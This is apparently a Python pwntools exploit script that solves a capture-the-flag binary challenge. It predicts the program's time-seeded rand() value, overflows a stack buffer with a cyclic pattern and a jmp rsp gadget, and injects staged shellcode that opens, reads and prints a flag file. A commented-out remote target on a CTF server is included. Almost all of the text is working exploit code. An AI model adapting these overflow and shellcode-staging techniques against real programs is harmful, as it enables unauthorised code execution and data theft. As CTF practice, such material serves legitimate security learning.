from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node1.anna.nssctf.cn",28725)
io=process("./R")
elf=ELF("./R")
cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

jmp_rsp=0x40094e
sd=cs.time(0)
cs.srand(sd)

io.recvuntil(b"num:\n")
io.sendline(str(cs.rand()%50))
io.recvuntil(b"door\n")

shellcode=asm('''
    xor rax,rax
    shl rdx,12
    mov esi,0x601700
    syscall
    jmp rsi
''')

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(jmp_rsp)+shellcode
io.send(payload)
shellcode=asm(shellcraft.open("./flag")+shellcraft.read(3,0x601200,0x50)+shellcraft.write(1,0x601200,0x50))
io.send(shellcode)
io.interactive()